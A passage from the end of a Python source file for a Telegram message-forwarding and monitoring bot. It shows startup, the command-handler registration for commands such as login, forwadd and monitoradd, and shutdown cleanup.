            return {"error": "bot main loop not available"}

    try:
        web_server.register_monitoring(_forward_metrics)
    except Exception:
        pass

    web_server.start()
    
    logger.info("✅ Combined bot initialized!")

async def _graceful_shutdown(application: Application):
    try:
        await shutdown_cleanup()
    except Exception:
        pass
    try:
        await application.stop()
    except Exception:
        pass

# ============================
# MAIN ENTRY POINT
# ============================
def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not found")
        return

    if not API_ID or not API_HASH:
        logger.error("❌ API_ID or API_HASH not found")
        return

    logger.info("🤖 Starting Forwarder + DuoDetective Bot...")
    logger.info(f"📊 Loaded {len(USER_SESSIONS)} string sessions from environment")

    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("login", login_command))
    application.add_handler(CommandHandler("logout", logout_command))
    application.add_handler(CommandHandler("forwadd", forwadd_command))
    application.add_handler(CommandHandler("fortasks", fortasks_command))
    application.add_handler(CommandHandler("monitoradd", monitoradd_command))
    application.add_handler(CommandHandler("monitortasks", monitortasks_command))
    application.add_handler(CommandHandler("getallid", getallid_command))
    application.add_handler(CommandHandler("ownersets", ownersets_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_messages))

    logger.info("✅ Bot ready!")
    try:
        application.run_polling(drop_pending_updates=True)
    finally:
        loop_to_use = None
        try:
            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
                loop_to_use = MAIN_LOOP
            else:
                try:
                    running_loop = asyncio.get_running_loop()
                    if getattr(running_loop, "is_running", lambda: False)():
                        loop_to_use = running_loop
                except RuntimeError:
                    loop_to_use = None
        except Exception:
            loop_to_use = None

        if loop_to_use:
            try:
                future = asyncio.run_coroutine_threadsafe(shutdown_cleanup(), loop_to_use)
                future.result(timeout=30)
            except Exception:
                pass
        else:
            tmp_loop = asyncio.new_event_loop()
            try:
                asyncio.set_event_loop(tmp_loop)
                tmp_loop.run_until_complete(shutdown_cleanup())
            finally:
                try:
                    tmp_loop.close()
                except Exception:
                    pass

if __name__ == "__main__":
    main()
